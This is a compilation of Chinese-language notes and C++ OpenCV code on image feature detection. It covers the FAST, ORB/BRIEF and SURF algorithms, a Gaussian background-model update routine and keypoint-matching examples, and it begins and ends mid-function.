                                  CvGaussBGPoint* g_point,
                                  const CvGaussBGStatModelParams *bg_model_params)
{
    int k, m;
    double alpha;
    int match_sum_total = 0;

    //new value of last one
    g_point->g_values[bg_model_params->n_gauss - 1].match_sum = 1;	//将新的高斯分布的match_sum置为1
    
    //get sum of all but last value of match_sum    
    for( k = 0; k < bg_model_params->n_gauss ; k++ )
        match_sum_total += g_point->g_values[k].match_sum;
    
	//设置新的高斯分布的参数
    g_point->g_values[bg_model_params->n_gauss - 1].weight = 1./(double)match_sum_total; //给新的高斯分布设置一个较小的权值，即1.0/ match_sum_total
    for( m = 0; m < gm_image->nChannels ; m++ )
    {
        // first pass mean is image value
        g_point->g_values[bg_model_params->n_gauss - 1].variance[m] = bg_model_params->variance_init;	//初始化一个较大的方差
        g_point->g_values[bg_model_params->n_gauss - 1].mean[m] = (unsigned char)gm_image->imageData[p + m]; //将当前像素值作为均值
    }
    
//更新其余高斯分布的参数
    alpha = 1.0 - (1.0/bg_model_params->win_size);
    for( k = 0; k < bg_model_params->n_gauss - 1; k++ )
{
	   //更新权值的公式为：
        g_point->g_values[k].weight *= alpha;
        if( match[k] )	//对于匹配的高斯分布，权值更新公式为
            g_point->g_values[k].weight += alpha;
    }
}
//////////////////////////////////////////////////// icvUpdatePartialWindow ////////////////////////////////////////////////////////////
功能：更新各高斯分布的权重值（对于匹配上的高斯分布要增大权值，其余的减小权值），如果存在匹配上的高斯分布，还要更新其均值和方差。
static void icvUpdatePartialWindow( double* src_pixel, int nChannels, int* match, CvGaussBGPoint* g_point, const CvGaussBGStatModelParams *bg_model_params )
{
    int k, m;
    int window_current = 0;
    
    for( k = 0; k < bg_model_params->n_gauss; k++ )
        window_current += g_point->g_values[k].match_sum;
    
    for( k = 0; k < bg_model_params->n_gauss; k++ )
    {
        g_point->g_values[k].match_sum += match[k];
        double learning_rate_weight = (1.0/((double)window_current + 1.0)); //increased by one since sum
        g_point->g_values[k].weight = g_point->g_values[k].weight +
            (learning_rate_weight*((double)match[k] - g_point->g_values[k].weight));
        
        if( g_point->g_values[k].match_sum > 0 && match[k] )
        {
            double learning_rate_gaussian = (double)match[k]/((double)g_point->g_values[k].match_sum);
            for( m = 0; m < nChannels; m++ )
            {
                const double tmpDiff = src_pixel[m] - g_point->g_values[k].mean[m];
                g_point->g_values[k].mean[m] = g_point->g_values[k].mean[m] +
                    (learning_rate_gaussian*tmpDiff);
                g_point->g_values[k].variance[m] = g_point->g_values[k].variance[m]+
                    (learning_rate_gaussian*((tmpDiff*tmpDiff) - g_point->g_values[k].variance[m]));
            }
        }
    }
} 






1.FAST（featuresfrom
 accelerated segment test）算法
 
http://blog.csdn.net/yang_xian521/article/details/7411438
 
特征点检测和匹配是计算机视觉中一个很有用的技术。在物体检测，视觉跟踪，三维常年关键等领域都有很广泛的应用。很多传统的算法都很耗时，而且特征点检测算法只是很多复杂图像处理里中的第一步，得不偿失。FAST特征点检测是公认的比较快速的特征点检测方法，只利用周围像素比较的信息就可以得到特征点，简单，有效。
 
 
FAST特征检测算法来源于corner的定义，这个定义基于特征点周围的图像灰度值，检测候选特征点周围一圈的像素值，如果候选点周围领域内有足够多的像素点与该候选点的灰度值差别够大，则认为该候选点为一个特征点。
 
 

其中I（x）为圆周上任意一点的灰度，I（p）为圆心的灰度，Ed为灰度值差得阈值，如果N大于给定阈值，一般为周围圆圈点的四分之三，则认为p是一个特征点。
 
 
为了获得更快的结果，还采用了额外的加速办法。如果测试了候选点周围每隔90度角的4个点，应该至少有3个和候选点的灰度值差足够大，否则则不用再计算其他点，直接认为该候选点不是特征点。候选点周围的圆的选取半径是一个很重要的参数，这里我为了简单高效，采用半径为3，共有16个周边像素需要比较。为了提高比较的效率，通常只使用N个周边像素来比较，也就是大家经常说的FAST-N。我看很多文献推荐FAST-9，作者的主页上有FAST-9、FAST-10、FAST-11、FAST-12，大家使用比较多的是FAST-9和FAST-12。上个图说明的更形象一些
 
 


 
 
OpenCV里对FAST的使用也非常简单，先声明一组特征点，构建FAST特征检测，接下来调用detect函数检测图像中的特征点，最后把特征点绘制到图片上。上代码说的清楚些
 

 

 
Features From Accelerated Segment Test
1. Fast算法原理
博客中已经介绍了很多图像特征检测算子，我们可以用LoG或者DoG检测图像中的Blobs（斑点检测），可以根据图像局部的自相关函数来求得Harris角点（Harris角点），后面又提到了两种十分优秀的特征点及它们的描述方法SIFT特征与SURF特征。
 
SURF特征算是为了提高运算效率对SIFT特征的一种近似，虽然在有些实验环境中已经达到了实时，但是我们实践工程应用中，特征点的提取与匹配只是整个应用算法中的一部分，所以我们对于特征点的提取必须有更高的要求，从这一点来看前面介绍的的那些特征点方法都不可取。
 
为了解决这个问题，Edward Rosten和Tom
 Drummond在2006年发表的“Machine learning for high-speedcorner detection[1]”文章中提出了一种FAST特征，并在2010年对这篇论文作了小幅度的修改后重新发表[2]。FAST的全称为Features
 From Accelerated SegmentTest。Rosten等人将FAST角点定义为：若某像素点与其周围领域内足够多的像素点处于不同的区域，则该像素点可能为角点。
 
也就是某些属性与众不同，考虑灰度图像，即若该点的灰度值比其周围领域内足够多的像素点的灰度值大或者小，则该点可能为角点。
 
 
2. FAST算法步骤
从图片中选取一个像素$P$，下面我们将判断它是否是一个特征点。我们首先把它的亮度值设为$I_p$。 
设定一个合适的阈值$t$。 
考虑以该像素点为中心的一个半径等于3像素的离散化的Bresenham圆，这个圆的边界上有16个像素（如图1所示）。 



图1 FAST特征点示意图
现在，如果在这个大小为16个像素的圆上有$n$个连续的像素点，它们的像素值要么都比$I_p
 + t$大，要么都比$I_p - t$小，那么它就是一个角点。（如图1中的白色虚线所示）。$n$的值可以设置为12或者9，实验证明选择9可能会有更好的效果。 
 
 
上面的算法中，对于图像中的每一个点，我们都要去遍历其邻域圆上的16个点的像素，效率较低。我们下面提出了一种高效的测试（high-speed
 test）来快速排除一大部分非角点的像素。该方法仅仅检查在位置1，9，5和13四个位置的像素，首先检测位置1和位置9，如果它们都比阈值暗或比阈值亮，再检测位置5和位置13。如果$P$是一个角点，那么上述四个像素点中至少有3个应该必须都大于$I_p+t$或者小于$I_p-t$，因为若是一个角点，超过四分之三圆的部分应该满足判断条件。
 
如果不满足，那么$p$不可能是一个角点。对于所有点做上面这一部分初步的检测后，符合条件的将成为候选的角点，我们再对候选的角点，做完整的测试，即检测圆上的所有点。
上面的算法效率实际上是很高的，但是有点一些缺点：
当$n<12$时不能拒绝许多的候选点；检测出来的角点不是最优的，这是因为它的效率取决于问题的排序与角点的分布；对于角点分析的结果被丢弃了；多个特征点容易挤在一起。 
4.非极大值抑制
从邻近的位置选取了多个特征点是另一个问题，我们可以使用Non-Maximal Suppression来解决。
为每一个检测到的特征点计算它的响应大小（score function）$V$。这里$V$定义为点$p$和它周围16个像素点的绝对偏差的和。考虑两个相邻的特征点，并比较它们的$V$值。$V$值较低的点将会被删除。5. OpenCV中进行FAST特征检测
在OpenCV中进行FAST特征提取的函数为FAST。它一共有4个参数，第一个参数是输入的图像，第二个是返回的特征点，第三个是定义的阈值，第四个决定是否使用非极大值抑制。

void FAST(InputArray image,vector<KeyPoint>&
 keypoints,int threshold,boolnonmaxSuppression=true )

 

C++:void FASTX(InputArray image,vector<KeyPoint>&
 keypoints,int threshold,boolnonmaxSuppression,
int type)
 
另外还有一个接口为FASTX，它提供了第五个参数type用来指定FAST检测中像素邻域圆的参数：TYPE_9_16、TYPE_7_12、TYPE_5_8。
 
 
 
6.总结
 
FAST算法比其他已知的角点检测算法要快很多倍，但是当图片中的噪点较多时，它的健壮性并不好，而且算法的效果还依赖于一个阈值$t$。
 
而且FAST不产生多尺度特征而且FAST特征点没有方向信息，这样就会失去旋转不变性。
 
 
 
 
[1] Edward Rosten and Tom Drummond, “Machine learning for high speedcorner detection” in
 9th European Conference on Computer Vision, vol. 1, 2006,pp. 430–443.
 
 
[2] Edward Rosten, Reid Porter, and Tom Drummond, “Faster and better: amachine learning
 approach to corner detection” in IEEE Trans. Pattern 
Analysisand Machine Intelligence, 2010, vol 32, pp. 105-119.
 
在FAST特征提出之后，实时计算机视觉应用中特征提取性能才有显著改善。目前以其高计算效率(computational
 performance)、高可重复性(high repeatability)成为计算机视觉领域最流行的角点检测方法。
1997年，Simth提出了SUSAN角点检测方法[1]。网址http://users.fmrib.ox.ac.uk/~steve/susan/.在SUSAN方法的基础上，2005年,
 Rosten在论文[2]中提出基于The segment test criterion的角点检测方法，全称“Features
 fromAccelerated Segment Test”，简称FAST。
 
 

 
2006
年，Rosten在[3]中使用机器学习对FAST的一些缺点进行改进，他的主页http://www.edwardrosten.com/work/fast.html提供的FAST实现即基于此论文。后续在2009年提出性能增强(可重复性增强、计算效率下降)的FAST-ER[4]。
 
 

 
2010
年，Mair在ECCV会议论文[5]中提出AGAST特征。对FAST底层的the
 accelerated segment test进行改进，通过在扩展配置空间寻找最优决策树，使用特定树的组合获得自适应并且通用的accelerated segment test。对FAST
 9-16 detector提速约13%，对FAST 7-12 detector提速最高30%，对FAST
 5-8 detector提速最高50%。AGAST项目网址http://www6.in.tum.de/Main/ResearchAgast.
 
 

 
2011
年，S. Leutenegger在BRISK描述子[6]中提出multi-scale
 AGAST detector, 并用实验证明与SURF detector有等效的可重复性(equivalentrepeatability)。对Graffiti序列的第一幅图检测时间为17.20ms,约为SURF
 detector消耗时间的16%，SIFT detector消耗时间的1%.BRISK项目地址http://www.asl.ethz.ch/people/lestefan/personal/BRISK.
 
 

 

参考文献：[1]S. M. Simth, J. M. Brady, Susan - a new approach to low level imageprocessing. International Journal of Computer Vision 23, 1997.
[2]E. Rosten, T. Drummond, Fusing points and lines for high performancetracking. IEEE International Conference on Computer Vision, 2005.
[3]E. Rosten, T. Drummond, Machine learning for high-speed corner detection,ECCV 2006.
[4]E. Rosten, R. Porter, T. Drummond, Faster and better: A machine learningapproach to corner detection, IEEE PAMI, 2009.
[5]E. Mair, G. D. Hager, Adaptive and generic corner detection based on theaccelerated segment test, ECCV 2010.
[6]S. Leutenegger, et.al. Brisk:Binary robust invariant scalable keypoints,ICCV 2011.
 
 
 
代码：
 
 


 
<span style="font-family:SimSun;font-size:24px;">// feature_detection.cpp : 定义控制台应用程序的入口点。
//

#include "stdafx.h"
#include <iostream>

#include <opencv2/core/core.hpp>
#include <opencv2/features2d/features2d.hpp>
#include <opencv2/highgui/highgui.hpp>
#include <opencv2/nonfree/nonfree.hpp>             //  sift特征在这个头文件中  

#include <vector>

#pragma comment(lib,"opencv_core2410d.lib")              
#pragma comment(lib,"opencv_highgui2410d.lib")              
#pragma comment(lib,"opencv_imgproc2410d.lib") 
#pragma comment(lib,"opencv_features2d2410d.lib") 
#pragma comment(lib,"opencv_nonfree2410d.lib") 

using namespace std;
using namespace cv;

//struct DrawMatchesFlags
//{   
//	enum    {
//		DEFAULT = 0, // 输出图像将被创建(Mat::create),
//		// 只画出特征点，而不画出周围的circle包含特征点的大小和方向.
//		DRAW_OVER_OUTIMG = 1, // 输出图像将被创建(using Mat::create)，匹配点将被画在输出图像的内容上.
//		NOT_DRAW_SINGLE_POINTS = 2, // 单个的点不画出.
//		DRAW_RICH_KEYPOINTS = 4 // 对每个特征点周围的circle，包含特征点的大小和方向将被画出.    
//	};
//};
void fast_feature()
{
	Mat image;
	image = imread("swan.jpg");
	// vector of keyPoints
	std::vector<KeyPoint> keyPoints;
	// construction of the fast feature detector object
	FastFeatureDetector fast(80);	// 检测的阈值为80
	// feature point detection
	fast.detect(image,keyPoints);
	drawKeypoints(image, keyPoints, image, Scalar::all(-1), DrawMatchesFlags::DRAW_OVER_OUTIMG);
	imshow("FAST feature", image);
	//cvWaitKey(0);
}



bool sift_feature()
{
	Mat image = imread("swan.jpg", 1);
	if(!image.data)
	{
		cout << "Fail to load image" << endl;
		return 0;
		
	}
	vector<KeyPoint> keypoints;          //  存放关键点

	// 其中0.03代表特征的阀值：用于去除低对比度的关键点   10是用于降低直线敏感度的阀值：去除不稳点的边缘响应点
	SiftFeatureDetector sift(0.03, 10.0);   
	sift.detect(image, keypoints);

	drawKeypoints(image, keypoints, image, Scalar(255,255,255), DrawMatchesFlags::DRAW_RICH_KEYPOINTS);
	namedWindow("sift");
	imshow("sift", image);
	
	
}

void main()
{
	sift_feature();
	fast_feature();

	waitKey(0);
	
}</span>
 

 
 
参考文献：
 
 
 
http://blog.csdn.net/yang_xian521/article/details/7411438
 
http://blog.csdn.net/cy513/article/details/4285579
 
http://blog.csdn.net/sunanger_wang/article/details/7949202
 
 







        ORB算法

ORB是是ORiented Brief的简称。ORB的描述在下面文章中：
Ethan Rublee and Vincent Rabaud and Kurt Konolige and Gary Bradski, ORB: an efcient alternative to SIFT or SURF, ICCV 2011
没有加上链接是因为作者确实还没有放出论文，不过OpenCV2.3RC中已经有了实现，WillowGarage有一个talk也提到了这个算法，因此我不揣浅陋，在这里总结一下。
Brief是Binary Robust Independent Elementary Features的缩写。这个特征描述子是由EPFL的Calonder在ECCV2010上提出的。主要思路就是在特征点附近随机选取若干点对，将这些点对的灰度值的大小，组合成一个二进制串，并将这个二进制串作为该特征点的特征描述子。详细算法描述参考如下论文：
Calonder M., Lepetit V., Strecha C., Fua P.: BRIEF: Binary Robust Independent Elementary Features. ECCV 2010
注意在BRIEF eccv2010的文章中，BRIEF描述子中的每一位是由随机选取的两个像素点做二进制比较得来的。文章同样提到，在此之前，需要选取合适的gaussian kernel对图像做平滑处理。（为什么要强调这一点，因为下述的ORB对此作了改进。）
BRIEF的优点在于速度，缺点也相当明显：
1：不具备旋转不变性。
2：对噪声敏感
3：不具备尺度不变性。
ORB就是试图解决上述缺点中的1和2.
如何解决旋转不变性：
在ORB的方案中，是采用了FAST作为特征点检测算子。FAST应用的很多了，是出名的快，以防有人不知道，请看这里：

在Sift的方案中，特征点的主方向是由梯度直方图的最大值和次大值所在的bin对应的方向决定的。略嫌耗时。
在ORB的方案中，特征点的主方向是通过矩（moment）计算而来，公式如下：

有了主方向之后，就可以依据该主方向提取BRIEF描述子。但是由此带来的问题是，由于主方向会发生变化，随机点对的相关性会比较大，从而降低描述子的判别性。解决方案也很直接，采取贪婪的，穷举的方法，暴力找到相关性较低的随机点对。

如何解决对噪声敏感的问题：
在前面提到过，在最早的eccv2010的文章中，BRIEF使用的是pixel跟pixel的大小来构造描述子的每一个bit。这样的后果就是对噪声敏感。因此，在ORB的方案中，做了这样的改进，不再使用pixel-pair，而是使用9×9的patch-pair，也就是说，对比patch的像素值之和。（可以通过积分图快速计算）。
关于尺度不变性：
ORB没有试图解决尺度不变性，（因为FAST本身就不具有尺度不变性。）但是这样只求速度的特征描述子，一般都是应用在实时的视频处理中的，这样的话就可以通过跟踪还有一些启发式的策略来解决尺度不变性的问题。
关于计算速度：
ORB是sift的100倍，是surf的10倍。
关于性能：
下面是一个性能对比，ORB还是很给力。点击看大图。

参考Slides
Related posts
Android-opencv之CVCamera (1) 
最新版的OpenCV中新增加的ORB特征的使用

看到OpenCV2.3.1里面ORB特征提取算法也在里面了，套用给的SURF特征例子程序改为ORB特征一直提示错误，类型不匹配神马的，由于没有找到示例程序，只能自己找答案。
（ORB特征论文：ORB： an efficient alternative to SIFT or SURF.点击下载论文）
经过查找发现：
描述符数据类型有是float的，比如说SIFT，SURF描述符，还有是uchar的，比如说有ORB，BRIEF
对于float 匹配方式有：
FlannBased
BruteForce<L2<float> >
BruteForce<SL2<float> >
BruteForce<L1<float> >
对于uchar有：
BruteForce<Hammin>
BruteForce<HammingLUT>
BruteForceMatcher< L2<float> > matcher;//改动的地方
完整代码如下： 
#include <iostream>
#include "opencv2/core/core.hpp"
#include "opencv2/features2d/features2d.hpp"
#include "opencv2/highgui/highgui.hpp"
#include <iostream>
#include <vector>
using namespace cv;
using namespace std;
int main()
{
	Mat img_1 = imread("D:\\image\\img1.jpg");
	Mat img_2 = imread("D:\\image\\img2.jpg");
	if (!img_1.data || !img_2.data)
	{
		cout << "error reading images " << endl;
		return -1;
	}

	ORB orb;
	vector<KeyPoint> keyPoints_1, keyPoints_2;
	Mat descriptors_1, descriptors_2;

	orb(img_1, Mat(), keyPoints_1, descriptors_1);
	orb(img_2, Mat(), keyPoints_2, descriptors_2);
	
	BruteForceMatcher<HammingLUT> matcher;
	vector<DMatch> matches;
	matcher.match(descriptors_1, descriptors_2, matches);

	double max_dist = 0; double min_dist = 100;
	//-- Quick calculation of max and min distances between keypoints
	for( int i = 0; i < descriptors_1.rows; i++ )
	{ 
		double dist = matches[i].distance;
		if( dist < min_dist ) min_dist = dist;
		if( dist > max_dist ) max_dist = dist;
	}
	printf("-- Max dist : %f \n", max_dist );
	printf("-- Min dist : %f \n", min_dist );
	//-- Draw only "good" matches (i.e. whose distance is less than 0.6*max_dist )
	//-- PS.- radiusMatch can also be used here.
	std::vector< DMatch > good_matches;
	for( int i = 0; i < descriptors_1.rows; i++ )
	{ 
		if( matches[i].distance < 0.6*max_dist )
		{ 
			good_matches.push_back( matches[i]); 
		}
	}

	Mat img_matches;
	drawMatches(img_1, keyPoints_1, img_2, keyPoints_2,
		good_matches, img_matches, Scalar::all(-1), Scalar::all(-1),
		vector<char>(), DrawMatchesFlags::NOT_DRAW_SINGLE_POINTS);
	imshow( "Match", img_matches);
	cvWaitKey();
	return 0;
}
另外: SURF SIFT 
/* 
SIFT sift; 
sift(img_1, Mat(), keyPoints_1, descriptors_1); 
sift(img_2, Mat(), keyPoints_2, descriptors_2); 
BruteForceMatcher<L2<float> >  matcher; 
*/ 
/* 
SURF surf; 
surf(img_1, Mat(), keyPoints_1); 
surf(img_2, Mat(), keyPoints_2); 
SurfDescriptorExtractor extrator; 
extrator.compute(img_1, keyPoints_1, descriptors_1); 
extrator.compute(img_2, keyPoints_2, descriptors_2); 
BruteForceMatcher<L2<float> >  matcher; 
*/
效果： 

另外一个是寻找目标匹配
在右边的场景图里面寻找左边那幅图的starbucks标志
效果如下：

需要在之前的那个imshow之前加上如下代码即可完成一个简单的功能展示：
	// localize the object
	std::vector<Point2f> obj;
	std::vector<Point2f> scene;

	for (size_t i = 0; i < good_matches.size(); ++i)
	{
		// get the keypoints from the good matches
		obj.push_back(keyPoints_1[ good_matches[i].queryIdx ].pt);
		scene.push_back(keyPoints_2[ good_matches[i].trainIdx ].pt);
	}
	Mat H = findHomography( obj, scene, CV_RANSAC );

	// get the corners from the image_1
	std::vector<Point2f> obj_corners(4);
	obj_corners[0] = cvPoint(0,0);
	obj_corners[1] = cvPoint( img_1.cols, 0);
	obj_corners[2] = cvPoint( img_1.cols, img_1.rows);
	obj_corners[3] = cvPoint( 0, img_1.rows);
	std::vector<Point2f> scene_corners(4);

	perspectiveTransform( obj_corners, scene_corners, H);

	// draw lines between the corners (the mapped object in the scene - image_2)
	line( img_matches, scene_corners[0] + Point2f( img_1.cols, 0), scene_corners[1] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[1] + Point2f( img_1.cols, 0), scene_corners[2] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[2] + Point2f( img_1.cols, 0), scene_corners[3] + Point2f( img_1.cols, 0),Scalar(0,255,0));
	line( img_matches, scene_corners[3] + Point2f( img_1.cols, 0), scene_corners[0] + Point2f( img_1.cols, 0),Scalar(0,255,0));
 
 
 
代码片：
 
 
#include "opencv2/highgui/highgui.hpp" 
#include "opencv2/features2d/features2d.hpp" 
#include <iostream> 

int main( )  
{  
   cv::Ptr<cv::FeatureDetector> detector = cv::FeatureDetector::create( "SIFT" );  
   cv::Ptr<cv::DescriptorExtractor> extractor = cv::DescriptorExtractor::create("SIFT" );  
   cv::Mat im = cv::imread("box.png", CV_LOAD_IMAGE_COLOR );  
   std::vector<cv::KeyPoint> keypoints;  
   cv::Mat descriptors;  
   detector->detect( im, keypoints);  
   extractor->compute( im,keypoints,descriptors);  

int duplicateNum = 0;  
for (int i=0;i<keypoints.size();i++)  
   {  
for (int j=i+1;j<keypoints.size();j++)  
      {  
float dist = abs((keypoints[i].pt.x-keypoints[j].pt.x))+abs((keypoints[i].pt.y-keypoints[j].pt.y));  
if (dist == 0)  
         {  
            cv::Mat descriptorDiff = descriptors.row(i)-descriptors.row(j);  
double diffNorm = cv::norm(descriptorDiff);  
            std::cout<<"keypoint "<<i<<" equal to keypoint "<<j<<" descriptor distance "<<diffNorm<<std::endl;  
            duplicateNum++;  
         }  
      }  
   }  
   std::cout<<"Total keypoint: "<<keypoints.size()<<", duplicateNum: "<<duplicateNum<<std::endl;  

return 1;  
}  


 






Surf(Speed Up Robust Feature)Surf算法的原理                                                                          1.构建Hessian矩阵构造高斯金字塔尺度空间其实surf构造的金字塔图像与sift有很大不同，就是因为这些不同才加快了其检测的速度。Sift采用的是DOG图像，而surf采用的是Hessian矩阵行列式近似值图像。Hessian矩阵是Surf算法的核心，为了方便运算，假设函数f(z，y)，Hessian矩阵H是由函数，偏导数组成。首先来看看图像中某个像素点的Hessian矩阵，如下：即每一个像素点都可以求出一个Hessian矩阵。H矩阵判别式为：判别式的值是H矩阵的特征值，可以利用判定结果的符号将所有点分类，根据判别式取值正负，来判别该点是或不是极值点。在SURF算法中，用图像像素l(x，y)即为函数值f(x，y)，选用二阶标准高斯函数作为滤波器，通过特定核间的卷积计算二阶偏导数，这样便能计算出H矩阵的三个矩阵元素L_xx,L_xy,L_yy 从而计算出H矩阵：但是由于我们的特征点需要具备尺度无关性，所以在进行Hessian矩阵构造前，需要对其进行高斯滤波。这样，经过滤波后在进行Hessian的计算，其公式如下：L(x,t)是一幅图像在不同解析度下的表示，可以利用高斯核G(t)与图像函数 I(x) 在点x的卷积来实现，其中高斯核G(t)：g(x)为高斯函数，t为高斯方差。通过这种方法可以为图像中每个像素计算出其H行列式的决定值，并用这个值来判别特征点。为方便应用，Herbert Bay提出用近似值现代替L(x,t)。为平衡准确值与近似值间的误差引入权值叫，权值随尺度变化，则H矩阵判别式可表示为：其中0.9是作者给出的一个经验值，其实它是有一套理论计算的，具体去看surf的英文论文。由于求Hessian时要先高斯平滑，然后求二阶导数，这在离散的像素点是用模板卷积形成的，这2中操作合在一起用一个模板代替就可以了，比如说y方向上的模板如下：该图的左边即用高斯平滑然后在y方向上求二阶导数的模板，为了加快运算用了近似处理，其处理结果如右图所示，这样就简化了很多。并且右图可以采用积分图来运算，大大的加快了速度，关于积分图的介绍，可以去查阅相关的资料。同理，x和y方向的二阶混合偏导模板如下所示：上面讲的这么多只是得到了一张近似hessian行列式图，这类似sift中的DOG图，但是在金字塔图像中分为很多层，每一层叫做一个octave，每一个octave中又有几张尺度不同的图片。在sift算法中，同一个octave层中的图片尺寸(即大小)相同，但是尺度(即模糊程度)不同，而不同的octave层中的图片尺寸大小也不相同，因为它是由上一层图片降采样得到的。在进行高斯模糊时，sift的高斯模板大小是始终不变的，只是在不同的octave之间改变图片的大小。而在surf中，图片的大小是一直不变的，不同的octave层得到的待检测图片是改变高斯模糊尺寸大小得到的，当然了，同一个octave中个的图片用到的高斯模板尺度也不同。算法允许尺度空间多层图像同时被处理，不需对图像进行二次抽样，从而提高算法性能。左图是传统方式建立一个如图所示的金字塔结构，图像的寸是变化的，并且运 算会反复使用高斯函数对子层进行平滑处理，右图说明Surf算法使原始图像保持不变而只改变滤波器大小。Surf采用这种方法节省了降采样过程，其处理速度自然也就提上去了。其金字塔图像如下所示：2. 利用非极大值抑制初步确定特征点        此步骤和sift类似，将经过hessian矩阵处理过的每个像素点与其3维领域的26个点进行大小比较，如果它是这26个点中的最大值或者最小值，则保留下来，当做初步的特征点。检测过程中使用与该尺度层图像解析度相对应大小的滤波器进行检测，以3×3的滤波器为例，该尺度层图像中9个像素点之一图2检测特征点与自身尺度层中其余8个点和在其之上及之下的两个尺度层9个点进行比较，共26个点，图2中标记‘x’的像素点的特征值若大于周围像素则可确定该点为该区域的特征点。3. 精确定位极值点         这里也和sift算法中的类似，采用3维线性插值法得到亚像素级的特征点，同时也去掉那些值小于一定阈值的点，增加极值使检测到的特征点数量减少，最终只有几个特征最强点会被检测出来。4. 选取特征点的主方向。        这一步与sift也大有不同。Sift选取特征点主方向是采用在特征点领域内统计其梯度直方图，取直方图bin值最大的以及超过最大bin值80%的那些方向做为特征点的主方向。       而在surf中，不统计其梯度直方图，而是统计特征点领域内的harr小波特征。即在特征点的领域(比如说，半径为6s的圆内，s为该点所在的尺度)内，统计60度扇形内所有点的水平haar小波特征和垂直haar小波特征总和，haar小波的尺寸变长为4s，这样一个扇形得到了一个值。然后60度扇形以一定间隔进行旋转，最后将最大值那个扇形的方向作为该特征点的主方向。该过程的示意图如下：5. 构造surf特征点描述算子        在sift中，是在特征点周围取16*16的邻域，并把该领域化为4*4个的小区域，每个小区域统计8个方向梯度，最后得到4*4*8=128维的向量，该向量作为该点的sift描述子。在surf中，也是在特征点周围取一个正方形框，框的边长为20s(s是所检测到该特征点所在的尺度)。该框带方向，方向当然就是第4步检测出来的主方向了。然后把该框分为16个子区域，每个子区域统计25个像素的水平方向和垂直方向的haar小波特征，这里的水平和垂直方向都是相对主方向而言的。该haar小波特征为水平方向值之和，水平方向绝对值之和，垂直方向之和，垂直方向绝对值之和。该过程的示意图如下所示：这样每个小区域就有4个值，所以每个特征点就是16*4=64维的向量，相比sift而言，少了一半，这在特征匹配过程中会大大加快匹配速度。6.结束语Surf采用Henssian矩阵获取图像局部最值还是十分稳定的，但是在求主方向阶段太过于依赖局部区域像素的梯度方向，有可能使得找到的主方向不准确，后面的特征向量提取以及匹配都严重依赖于主方向，即使不大偏差角度也可以造成后面特征匹配的放大误差，从而匹配不成功；另外图像金字塔的层取 得不足够紧密也会使得尺度有误差，后面的特征向量提取同样依赖相应的尺度，发明者在这个问题上的折中解决方法是取适量的层然后进行插值。Sift是一种只 利用到灰度性质的算法，忽略了色彩信息，后面又出现了几种据说比Surf更稳定的描述器其中一些利用到了色彩信息，让我们拭目以待吧。代码：                                                                                                            来源：OpenCV/sample/c中的find_obj.cpp代码需仔细注意：1.定位部分：通过透视变换，画出了目标在图像中的位置，但是这么做会浪费很多时间，可以改进：2.flann寻找最近的临近Keypoints：首先，利用图像，构建多维查找树，然后，利用Knn算法找到最近的Keypoints (KNN算法：http://blog.csdn.net/sangni007/article/details/7482890）    //Constructs a nearest neighbor search index for a given dataset
    //利用m_image构造 a set of randomized kd-trees 一系列随机多维检索树;
    cv::flann::Index flann_index(m_image, cv::flann::KDTreeIndexParams(4));  // using 4 randomized kdtrees
    //利用Knn近邻算法检索m_object；结果存入 m_indices, m_dists；
    flann_index.knnSearch(m_object, m_indices, m_dists, 2, cv::flann::SearchParams(64) ); // maximum number of leafs checkedflann算法有很多功能，文档：http://opencv.itseez.com/modules/flann/doc/flann_fast_approximate_nearest_neighbor_search.html?highlight=flann#fast-approximate-nearest-neighbor-search/*
 * A Demo to OpenCV Implementation of SURF
 * Further Information Refer to "SURF: Speed-Up Robust Feature"
 * Author: Liu Liu
 * liuliu.1987+opencv@gmail.com
 */
#include "opencv2/objdetect/objdetect.hpp"
#include "opencv2/features2d/features2d.hpp"
#include "opencv2/highgui/highgui.hpp"
#include "opencv2/calib3d/calib3d.hpp"
#include "opencv2/imgproc/imgproc_c.h"#include <iostream>
#include <vector>
#include <stdio.h>using namespace std;
void help()
{
    printf(
        "This program demonstrated the use of the SURF Detector and Descriptor using\n"
        "either FLANN (fast approx nearst neighbor classification) or brute force matching\n"
        "on planar objects.\n"
        "Usage:\n"
        "./find_obj <object_filename> <scene_filename>, default is box.png  and box_in_scene.png\n\n");
    return;
}// define whether to use approximate nearest-neighbor search
#define USE_FLANN
IplImage* image = 0;double compareSURFDescriptors( const float* d1, const float* d2, double best, int length )
{
    double total_cost = 0;
    assert( length % 4 == 0 );
    for( int i = 0; i < length; i += 4 )
    {
        double t0 = d1[i  ] - d2[i  ];
        double t1 = d1[i+1] - d2[i+1];
        double t2 = d1[i+2] - d2[i+2];
        double t3 = d1[i+3] - d2[i+3];
        total_cost += t0*t0 + t1*t1 + t2*t2 + t3*t3;
        if( total_cost > best )
            break;
    }
    return total_cost;
}
int naiveNearestNeighbor( const float* vec, int laplacian,
                      const CvSeq* model_keypoints,
                      const CvSeq* model_descriptors )
{
    int length = (int)(model_descriptors->elem_size/sizeof(float));
    int i, neighbor = -1;
    double d, dist1 = 1e6, dist2 = 1e6;
    CvSeqReader reader, kreader;
    cvStartReadSeq( model_keypoints, &kreader, 0 );
    cvStartReadSeq( model_descriptors, &reader, 0 );    for( i = 0; i < model_descriptors->total; i++ )
    {
        const CvSURFPoint* kp = (const CvSURFPoint*)kreader.ptr;
        const float* mvec = (const float*)reader.ptr;
     CV_NEXT_SEQ_ELEM( kreader.seq->elem_size, kreader );
        CV_NEXT_SEQ_ELEM( reader.seq->elem_size, reader );
        if( laplacian != kp->laplacian )
            continue;
        d = compareSURFDescriptors( vec, mvec, dist2, length );
        if( d < dist1 )
        {
            dist2 = dist1;
            dist1 = d;
            neighbor = i;
        }
        else if ( d < dist2 )
            dist2 = d;
    }
    if ( dist1 < 0.6*dist2 )
        return neighbor;
    return -1;
}//用于找到两幅图像之间匹配的点对，并把匹配的点对存储在 ptpairs 向量中，其中物体(object)图像的特征点
//及其相应的描述器（局部特征）分别存储在 objectKeypoints 和 objectDescriptors，场景(image)图像的特
//征点及其相应的描述器（局部特征）分别存储在 imageKeypoints和 imageDescriptors
void findPairs( const CvSeq* objectKeypoints, const CvSeq* objectDescriptors,
           const CvSeq* imageKeypoints, const CvSeq* imageDescriptors, vector<int>& ptpairs )
{
    int i;
    CvSeqReader reader, kreader;
    cvStartReadSeq( objectKeypoints, &kreader );
    cvStartReadSeq( objectDescriptors, &reader );
    ptpairs.clear();    for( i = 0; i < objectDescriptors->total; i++ )
    {
